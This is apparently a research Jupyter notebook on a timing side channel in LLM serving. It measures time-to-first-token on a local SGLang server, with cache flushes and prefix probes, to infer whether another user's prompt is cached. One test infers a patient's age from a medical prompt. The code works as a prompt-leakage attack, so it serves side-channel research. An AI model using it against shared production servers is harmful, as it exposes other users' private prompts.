{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "c3fc4cb4",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/data/chaejin/kvcache/kvenv/lib/python3.12/site-packages/tqdm/auto.py:21: TqdmWarning: IProgress not found. Please update jupyter and ipywidgets. See https://ipywidgets.readthedocs.io/en/stable/user_install.html\n",
      "  from .autonotebook import tqdm as notebook_tqdm\n"
     ]
    }
   ],
   "source": [
    "import time\n",
    "import requests\n",
    "import json\n",
    "import random\n",
    "import string\n",
    "from sglang.utils import print_highlight\n",
    "import asyncio\n",
    "import aiohttp\n",
    "import numpy as np\n",
    "from transformers import AutoTokenizer\n",
    "from datasets import load_dataset\n",
    "from collections import Counter\n",
    "from tqdm import tqdm\n",
    "import multiprocessing\n",
    "import pandas as pd\n",
    "from tqdm.asyncio import tqdm_asyncio"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "47b96341",
   "metadata": {},
   "source": [
    "#### offline"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f40e168a",
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "import pandas as pd\n",
    "from collections import Counter\n",
    "from tqdm import tqdm\n",
    "import multiprocessing\n",
    "from datasets import load_dataset\n",
    "from transformers import AutoTokenizer\n",
    "\n",
    "# ... (Previous setup code remains the same) ...\n",
    "\n",
    "# 1. Load Resources (Assuming you ran this part already)\n",
    "model_id = \"meta-llama/Llama-3.2-1B-Instruct\"\n",
    "tokenizer = AutoTokenizer.from_pretrained(model_id)\n",
    "ds = load_dataset(\"HuggingFaceH4/ultrachat_200k\", split=\"train_gen\")\n",
    "\n",
    "def extract_text(batch):\n",
    "    batch_text = []\n",
    "    for messages in batch[\"messages\"]:\n",
    "        full_conversation = \" \".join([m[\"content\"] for m in messages])\n",
    "        batch_text.append(full_conversation)\n",
    "    return batch_text\n",
    "\n",
    "def count_tokens_in_batch(batch):\n",
    "    texts = extract_text(batch)\n",
    "    encodings = tokenizer(texts, add_special_tokens=False)\n",
    "    \n",
    "    batch_counts = Counter()\n",
    "    for seq in encodings[\"input_ids\"]:\n",
    "        batch_counts.update(seq)\n",
    "    json_counts = json.dumps(dict(batch_counts))\n",
    "    return {\"json_counts\": [json_counts]}\n",
    "\n",
    "print(\"Tokenizing and counting in parallel...\")\n",
    "processed = ds.map(\n",
    "    count_tokens_in_batch,\n",
    "    batched=True,\n",
    "    batch_size=1000,\n",
    "    remove_columns=ds.column_names,\n",
    "    num_proc=multiprocessing.cpu_count()\n",
    ")\n",
    "\n",
    "total_counts = Counter()\n",
    "print(\"Aggregating partial counts...\")\n",
    "\n",
    "for row in tqdm(processed):\n",
    "    # JSON keys are always strings, so total_counts will have string keys (e.g., \"101\": 5)\n",
    "    partial_counts = json.loads(row[\"json_counts\"])\n",
    "    total_counts.update(partial_counts)\n",
    "\n",
    "total_tokens = sum(total_counts.values())\n",
    "\n",
    "# --- NEW LOGIC STARTS HERE ---\n",
    "\n",
    "print(\"Filling in missing tokens (count=0)...\")\n",
    "\n",
    "# 1. Create DataFrame from existing counts\n",
    "df = pd.DataFrame.from_dict(total_counts, orient='index', columns=['count'])\n",
    "\n",
    "# 2. Convert index to integers (JSON made them strings)\n",
    "df.index = df.index.astype(int)\n",
    "\n",
    "# 3. REINDEX: This forces the DataFrame to have exactly rows 0 to vocab_size-1\n",
    "#    'fill_value=0' ensures that any token ID not found in the counts gets a 0.\n",
    "all_token_ids = range(tokenizer.vocab_size)\n",
    "df = df.reindex(all_token_ids, fill_value=0)\n",
    "\n",
    "# 4. formatting\n",
    "df.index.name = 'token_id'\n",
    "df.reset_index(inplace=True)\n",
    "\n",
    "# 5. Calculate probabilities (now including the 0 count tokens)\n",
    "# Note: Tokens with count 0 will have probability 0.0\n",
    "total_observed = df['count'].sum()\n",
    "df['probability'] = df['count'] / total_observed\n",
    "\n",
    "print(f\"Final DataFrame shape: {df.shape} (Should match vocab size: {tokenizer.vocab_size})\")\n",
    "\n",
    "# 6. Save\n",
    "df.to_parquet(\"token_prob.parquet\", engine=\"pyarrow\", index=False)\n",
    "print(\"Saved to token_prob.parquet (including zero-count tokens)\")\n",
    "tokenprob=pd.read_parquet(\"token_prob.parquet\")\n",
    "tokenprob[\"count\"]=tokenprob[\"count\"]+1\n",
    "total=sum(tokenprob[\"count\"].values.tolist())\n",
    "tokenprob[\"probability\"]=tokenprob[\"count\"]/total\n",
    "tokenprob.to_parquet(\"token_prob_norm.parquet\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "c7aa391f",
   "metadata": {},
   "outputs": [],
   "source": [
    "port=37168\n",
    "URL = f\"http://localhost:{port}/v1/chat/completions\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "5975ca53",
   "metadata": {},
   "outputs": [],
   "source": [
    "tokenizer=AutoTokenizer.from_pretrained(\"meta-llama/Llama-3.2-3B-Instruct\")\n",
    "ds = load_dataset(\"HuggingFaceH4/ultrachat_200k\",split=\"train_gen\")\n",
    "vocab=tokenizer.get_vocab()\n",
    "tokenprob=pd.read_parquet(\"token_prob_norm.parquet\")\n",
    "candidate_ids = tokenprob['token_id'].to_numpy()\n",
    "probabilities = tokenprob['probability'].to_numpy()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "e0032a4a",
   "metadata": {},
   "outputs": [],
   "source": [
    "def flush_cache():\n",
    "    flushurl = f\"http://localhost:{port}/flush_cache\"\n",
    "    response=requests.post(flushurl)\n",
    "    # print_highlight(response.text)\n",
    "    return\n",
    "\n",
    "def get_tokens(n=1):\n",
    "    ids=np.random.choice(candidate_ids, size=n, p=probabilities,replace=False)\n",
    "    tokens=[]\n",
    "    for tid in ids:\n",
    "        tok=tokenizer.decode([tid]).strip()\n",
    "        tokens.append(tok)\n",
    "    return tokens\n",
    "\n",
    "def victim(TARGET_PROMPT,URL,flush):\n",
    "    if flush:\n",
    "        flush_cache()\n",
    "    data = {\n",
    "        \"model\": \"default\",\n",
    "        \"messages\": [{\"role\": \"user\", \"content\": TARGET_PROMPT}],\n",
    "        \"temperature\": 0,\n",
    "        \"session_id\":0,\n",
    "        \"max_new_tokens\":128\n",
    "    }\n",
    "    response = requests.post(URL, json=data)\n",
    "    # print_highlight(response.json())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "7c3dc35a",
   "metadata": {},
   "outputs": [],
   "source": [
    "async def fetch_metrics_raw(session, prompt, request_id, URL):\n",
    "    payload = {\n",
    "        \"model\": \"default\", \n",
    "        \"messages\": [{\"role\": \"user\", \"content\": prompt}],\n",
    "        \"stream\": True,\n",
    "        \"temperature\": 0,\n",
    "        \"session_id\":0,\n",
    "        \"context_length\":128\n",
    "    }\n",
    "    start_time = time.perf_counter()\n",
    "    first_token_time = None\n",
    "    token_count = 0\n",
    "    ttft = 0\n",
    "    restext=\"\"\n",
    "    async with session.post(URL, json=payload) as response:\n",
    "        if response.status != 200:\n",
    "            return {\"id\": request_id, \"error\": f\"HTTP {response.status}\", \"status\": \"fail\"}\n",
    "        async for line in response.content:\n",
    "            decoded_line = line.decode('utf-8').strip()\n",
    "            if decoded_line.startswith(\"data: \"):\n",
    "                json_str = decoded_line[6:]\n",
    "                if json_str == \"[DONE]\":\n",
    "                    break\n",
    "                chunk = json.loads(json_str)\n",
    "                delta = chunk['choices'][0]['delta']\n",
    "                content = delta.get('content', '')\n",
    "                if content:\n",
    "                    restext+=content\n",
    "                    if first_token_time is None:\n",
    "                        first_token_time = time.perf_counter()\n",
    "                        ttft = first_token_time - start_time\n",
    "                    token_count += 1\n",
    "        end_time = time.perf_counter()\n",
    "        tpot = 0\n",
    "        if token_count > 1 and first_token_time:\n",
    "            generation_time = end_time - first_token_time\n",
    "            tpot = generation_time / (token_count - 1)\n",
    "        return {\n",
    "            \"id\": request_id,\n",
    "            \"prompt\": prompt,\n",
    "            \"ttft_ms\": ttft * 1000 if ttft else 0,\n",
    "            \"tpot_ms\": tpot * 1000,\n",
    "            \"tokens\": token_count,\n",
    "            \"status\": \"success\",\n",
    "            \"restext\":restext\n",
    "        }\n",
    "\n",
    "async def main(attack_prompts, URL):\n",
    "    async with aiohttp.ClientSession() as session:\n",
    "        print(f\"⚡ Sending {len(attack_prompts)} requests to SGLang ({URL})...\\n\")\n",
    "        tasks = []\n",
    "        for i, prompt in enumerate(attack_prompts):\n",
    "            tasks.append(fetch_metrics_raw(session, prompt, i, URL))\n",
    "        results = await tqdm_asyncio.gather(*tasks, desc=\"Attacking\")\n",
    "        print(f\"{'ID':<3} | {'TTFT (ms)':<10} | {'TPOT (ms)':<10} | {'Tokens':<6} | {'Prompt Snippet'}\")\n",
    "        print(\"-\" * 70)\n",
    "        successful_results = []\n",
    "        for res in results:\n",
    "            if res[\"status\"] == \"success\":\n",
    "                print(f\"{res['id']:<3} | {res['ttft_ms']:<10.2f} | {res['tpot_ms']:<10.2f} | {res['tokens']:<6} | {res['prompt'][:30]} | {res.get('restext', '')[:30]}\")\n",
    "                successful_results.append(res)\n",
    "            else:\n",
    "                print(f\"{res['id']:<3} | {'ERROR':<10} | {'-':<10} | {'-':<6} | {res['error']}\")\n",
    "        if successful_results:\n",
    "            ttfts = [r['ttft_ms'] for r in successful_results]\n",
    "            tpots = [r['tpot_ms'] for r in successful_results]\n",
    "            best_request = min(successful_results, key=lambda x: x['ttft_ms'])\n",
    "            \n",
    "            print(\"\\n--- Summary ---\")\n",
    "            print(f\"Avg TTFT: {np.mean(ttfts):.2f} ms\")\n",
    "            print(f\"Avg TPOT: {np.mean(tpots):.2f} ms\")\n",
    "            print(\"-\" * 30)\n",
    "            print(f\"Min TTFT:        {best_request['ttft_ms']:.2f} ms\")\n",
    "            print(f\"Min TTFT Prompt: \\\"{best_request['prompt']}\\\"\")\n",
    "        return best_request, successful_results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "d37baa63",
   "metadata": {},
   "outputs": [],
   "source": [
    "# target_tokens=[get_tokens(1)[0] for i in range(800)]\n",
    "target='''The ancient clock tower in the center of Eldoria had stopped ticking exactly one hundred years ago, at the precise moment the last King, Alaric the Just, had vanished. The hands were frozen at 11:59, a perpetual minute before midnight, a silent testament to a kingdom suspended in twilight.\n",
    "\n",
    "For Elara, a young clockmaker with nimble fingers and a heart full of curiosity, the tower was an obsession. While others avoided its looming shadow, whispering tales of curses and ghosts, Elara saw a puzzle waiting to be solved. Her workshop, cluttered with gears, springs, and pendulums, was filled with sketches of the tower's intricate mechanism. She knew every cog, every lever, every escapement by heart, yet the reason for its paralysis remained elusive.\n",
    "\n",
    "One crisp autumn morning, a stranger arrived in Eldoria. He was cloaked in gray, his face hidden beneath a hood, and he carried a staff of gnarled wood that seemed to hum with faint energy. He called himself Kaelen, a wanderer seeking lost knowledge. He found Elara in her workshop, examining a delicate balance wheel under a magnifying glass.\n",
    "\n",
    "“The heart of the tower does not beat,” Kaelen said, his voice raspy like dry leaves. “Not because it is broken, but because it is waiting.”\n",
    "\n",
    "Elara looked up, startled. “Waiting for what?”\n",
    "\n",
    "“For the King’s return,” Kaelen replied. “Or for someone brave enough to take his place.”\n",
    "\n",
    "Intrigued, Elara invited Kaelen to examine her blueprints. He pointed to a hidden chamber beneath the main mechanism, a detail she had missed in her years of study. “The Chronos Gem,” he explained. “A stone of immense power that regulated the flow of time within the kingdom. It was stolen the night the King disappeared.”\n",
    "\n",
    "Elara’s eyes widened. She had heard legends of the Gem, dismissed as fairy tales. “Where is it now?”\n",
    "\n",
    "Kaelen unrolled a faded map on her workbench. “In the Whispering Caverns, guarded by the Shadow Weaver. A creature of darkness that feeds on lost moments.”\n",
    "\n",
    "Determined to restore the clock and perhaps uncover the fate of the lost King, Elara agreed to accompany Kaelen. They set off at dawn, leaving the silent town behind. The journey to the Whispering Caverns was arduous. They traversed dense forests where trees whispered secrets of the past, and crossed treacherous ravines bridged by precarious ropes. Along the way, Kaelen taught Elara about the magic woven into the fabric of Eldoria, a magic fading with the stagnation of time.\n",
    "\n",
    "Finally, they reached the mouth of the caverns. The air was cold and damp, smelling of ozone and decay. Inside, shadows danced on the walls, twisting into grotesque shapes. Deeper they went, until they reached a vast underground lake. In the center, on a small island, pulsated a faint blue light—the Chronos Gem.\n",
    "\n",
    "But guarding it was the Shadow Weaver, a monstrous spider-like entity composed of swirling darkness. Its many eyes glowed with malevolent intent. Kaelen raised his staff, casting a protective barrier of light, while Elara sprinted towards the island.\n",
    "\n",
    "The Shadow Weaver lunged, its shadowy limbs slashing at Kaelen’s barrier. Elara reached the island, her hands trembling as she approached the Gem. It was warm to the touch, vibrating with a rhythmic pulse. She remembered Kaelen’s words: The tower is waiting.\n",
    "\n",
    "She didn't just need to take the gem; she needed to synchronize it. Pulling a small, intricate pocket watch from her vest—her masterpiece—she placed it next to the Gem. She began to chant an ancient rhyme Kaelen had taught her, a spell of binding spell.\n",
    "The Shadow Weaver shrieked.\n",
    "'''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "532d0616",
   "metadata": {},
   "outputs": [],
   "source": [
    "target_tokens=tokenizer.encode(target)\n",
    "blocks=[]\n",
    "prev=\"\"\n",
    "for i in range(50):\n",
    "    block=tokenizer.decode(target_tokens[i*16:(i+1)*16])\n",
    "    prev+=block\n",
    "    blocks.append(prev)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f044212",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\tBlock 0, Trial:12, TTFT:82.57767697796226, TPOT:40.099939626668565:   0%|          | 0/50 [10:11<?, ?it/s]"
     ]
    }
   ],
   "source": [
    "data=[]\n",
    "\n",
    "with tqdm(range(50)) as pbar:\n",
    "    for b in pbar:\n",
    "        for i in range(30):\n",
    "            victim(target,URL, True)\n",
    "            pbar.set_description_str(\"Flushed\")\n",
    "            prompt=blocks[b]\n",
    "            payload = {\n",
    "                \"model\": \"default\", \n",
    "                \"messages\": [{\"role\": \"user\", \"content\": prompt}],\n",
    "                \"stream\": True,\n",
    "                \"temperature\": 0,\n",
    "                \"session_id\":0,\n",
    "                \"max_new_tokens\":128\n",
    "            }\n",
    "            start_time = time.perf_counter()\n",
    "            first_token_time = None\n",
    "            token_count = 0\n",
    "            ttft = 0\n",
    "            restext=\"\"\n",
    "            response=requests.post(URL, json=payload,stream=True)\n",
    "            if response.status_code == 200:\n",
    "                for chunk in response.iter_lines(decode_unicode=False):\n",
    "                    chunk = chunk.decode(\"utf-8\")\n",
    "                    if chunk and chunk.startswith(\"data:\"):\n",
    "                        if chunk == \"data: [DONE]\":\n",
    "                            break\n",
    "                        chunk = json.loads(chunk[5:].strip(\"\\n\"))\n",
    "                        delta = chunk['choices'][0]['delta']\n",
    "                        content = delta.get('content', '')\n",
    "                        if content:\n",
    "                            restext+=content\n",
    "                            if first_token_time is None:\n",
    "                                first_token_time = time.perf_counter()\n",
    "                                ttft = first_token_time - start_time\n",
    "                            token_count += 1\n",
    "                end_time = time.perf_counter()\n",
    "                tpot = 0\n",
    "                if token_count > 1 and first_token_time:\n",
    "                    generation_time = end_time - first_token_time\n",
    "                    tpot = generation_time / (token_count - 1)\n",
    "                    \n",
    "                data.append({\n",
    "                    \"trial\":i,\n",
    "                    \"prompt\": prompt,\n",
    "                    \"ttft_ms\": ttft * 1000 if ttft else 0,\n",
    "                    \"tpot_ms\": tpot * 1000,\n",
    "                    \"tokens\": token_count,\n",
    "                    \"status\": \"success\",\n",
    "                    \"restext\":restext\n",
    "                })\n",
    "                pbar.set_description_str(f\"\\tBlock {b}, Trial:{i}, TTFT:{ttft*1000}, TPOT:{tpot*1000}\")\n",
    "                \n",
    "df=pd.DataFrame(data)\n",
    "df.to_parquet(\"block_timing.parquet\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "116d04fc",
   "metadata": {},
   "source": [
    "#### online"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d0a91445",
   "metadata": {},
   "outputs": [],
   "source": [
    "port=37168\n",
    "URL = f\"http://localhost:{port}/v1/chat/completions\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f7c96aa",
   "metadata": {},
   "outputs": [],
   "source": [
    "tokenizer=AutoTokenizer.from_pretrained(\"meta-llama/Llama-3.2-3B-Instruct\")\n",
    "ds = load_dataset(\"HuggingFaceH4/ultrachat_200k\",split=\"train_gen\")\n",
    "vocab=tokenizer.get_vocab()\n",
    "tokenprob=pd.read_parquet(\"token_prob_norm.parquet\")\n",
    "candidate_ids = tokenprob['token_id'].to_numpy()\n",
    "probabilities = tokenprob['probability'].to_numpy()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "51e94c9a",
   "metadata": {},
   "outputs": [],
   "source": [
    "def flush_cache():\n",
    "    flushurl = f\"http://localhost:{port}/flush_cache\"\n",
    "    response=requests.post(flushurl)\n",
    "    print_highlight(response.text)\n",
    "    return\n",
    "\n",
    "def get_tokens(n=1):\n",
    "    ids=np.random.choice(candidate_ids, size=n, p=probabilities,replace=False)\n",
    "    tokens=[]\n",
    "    for tid in ids:\n",
    "        tok=tokenizer.decode([tid]).strip()\n",
    "        tokens.append(tok)\n",
    "    return tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a8bc8ec9",
   "metadata": {},
   "outputs": [],
   "source": [
    "async def fetch_metrics_raw(session, prompt, request_id, URL):\n",
    "    payload = {\n",
    "        \"model\": \"default\", \n",
    "        \"messages\": [{\"role\": \"user\", \"content\": prompt}],\n",
    "        \"stream\": True,\n",
    "        \"temperature\": 0,\n",
    "        \"session_id\":0,\n",
    "        \"context_length\":128\n",
    "    }\n",
    "    start_time = time.perf_counter()\n",
    "    first_token_time = None\n",
    "    token_count = 0\n",
    "    ttft = 0\n",
    "    restext=\"\"\n",
    "    async with session.post(URL, json=payload) as response:\n",
    "        if response.status != 200:\n",
    "            return {\"id\": request_id, \"error\": f\"HTTP {response.status}\", \"status\": \"fail\"}\n",
    "        async for line in response.content:\n",
    "            decoded_line = line.decode('utf-8').strip()\n",
    "            if decoded_line.startswith(\"data: \"):\n",
    "                json_str = decoded_line[6:]\n",
    "                if json_str == \"[DONE]\":\n",
    "                    break\n",
    "                chunk = json.loads(json_str)\n",
    "                delta = chunk['choices'][0]['delta']\n",
    "                content = delta.get('content', '')\n",
    "                if content:\n",
    "                    restext+=content\n",
    "                    if first_token_time is None:\n",
    "                        first_token_time = time.perf_counter()\n",
    "                        ttft = first_token_time - start_time\n",
    "                    token_count += 1\n",
    "        end_time = time.perf_counter()\n",
    "        tpot = 0\n",
    "        if token_count > 1 and first_token_time:\n",
    "            generation_time = end_time - first_token_time\n",
    "            tpot = generation_time / (token_count - 1)\n",
    "        return {\n",
    "            \"id\": request_id,\n",
    "            \"prompt\": prompt,\n",
    "            \"ttft_ms\": ttft * 1000 if ttft else 0,\n",
    "            \"tpot_ms\": tpot * 1000,\n",
    "            \"tokens\": token_count,\n",
    "            \"status\": \"success\",\n",
    "            \"restext\":restext\n",
    "        }\n",
    "\n",
    "async def main(attack_prompts, URL):\n",
    "    async with aiohttp.ClientSession() as session:\n",
    "        print(f\"⚡ Sending {len(attack_prompts)} requests to SGLang ({URL})...\\n\")\n",
    "        tasks = []\n",
    "        for i, prompt in enumerate(attack_prompts):\n",
    "            tasks.append(fetch_metrics_raw(session, prompt, i, URL))\n",
    "        results = await tqdm_asyncio.gather(*tasks, desc=\"Attacking\")\n",
    "        print(f\"{'ID':<3} | {'TTFT (ms)':<10} | {'TPOT (ms)':<10} | {'Tokens':<6} | {'Prompt Snippet'}\")\n",
    "        print(\"-\" * 70)\n",
    "        successful_results = []\n",
    "        for res in results:\n",
    "            if res[\"status\"] == \"success\":\n",
    "                print(f\"{res['id']:<3} | {res['ttft_ms']:<10.2f} | {res['tpot_ms']:<10.2f} | {res['tokens']:<6} | {res['prompt'][:30]} | {res.get('restext', '')[:30]}\")\n",
    "                successful_results.append(res)\n",
    "            else:\n",
    "                print(f\"{res['id']:<3} | {'ERROR':<10} | {'-':<10} | {'-':<6} | {res['error']}\")\n",
    "        if successful_results:\n",
    "            ttfts = [r['ttft_ms'] for r in successful_results]\n",
    "            tpots = [r['tpot_ms'] for r in successful_results]\n",
    "            best_request = min(successful_results, key=lambda x: x['ttft_ms'])\n",
    "            \n",
    "            print(\"\\n--- Summary ---\")\n",
    "            print(f\"Avg TTFT: {np.mean(ttfts):.2f} ms\")\n",
    "            print(f\"Avg TPOT: {np.mean(tpots):.2f} ms\")\n",
    "            print(\"-\" * 30)\n",
    "            print(f\"Min TTFT:        {best_request['ttft_ms']:.2f} ms\")\n",
    "            print(f\"Min TTFT Prompt: \\\"{best_request['prompt']}\\\"\")\n",
    "        return best_request, successful_results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "75c73873",
   "metadata": {},
   "outputs": [],
   "source": [
    "def victim(TARGET_PROMPT,URL,flush):\n",
    "    if flush:\n",
    "        flush_cache()\n",
    "    data = {\n",
    "        \"model\": \"default\",\n",
    "        \"messages\": [{\"role\": \"user\", \"content\": TARGET_PROMPT}],\n",
    "        \"temperature\": 0,\n",
    "        \"session_id\":0    \n",
    "    }\n",
    "    response = requests.post(URL, json=data)\n",
    "    print_highlight(response.json())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "01b9670b",
   "metadata": {},
   "outputs": [],
   "source": [
    "while(True):\n",
    "    prompts=get_tokens(50)\n",
    "    if \"is\" in prompts:\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "245a6e32",
   "metadata": {},
   "outputs": [],
   "source": [
    "victim(\"The patient's age is 5. Please consider age-related health considerations and risks.\",URL,True)\n",
    "victim(\"The patient's age is %. Please consider age-related health considerations and risks.\",URL,False)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f9573526",
   "metadata": {},
   "outputs": [],
   "source": [
    "conprompts=[f\"The patient's age is {str(i)}. Please consider age-related health considerations and risks.\" for i in range(10)]\n",
    "best,suc=await main(conprompts, URL)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "50f169bc",
   "metadata": {},
   "outputs": [],
   "source": [
    "dfsuc=pd.DataFrame(suc)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5431035a",
   "metadata": {},
   "outputs": [],
   "source": [
    "dfsuc.sort_values(\"ttft_ms\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "573c0c1e",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "kvenv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
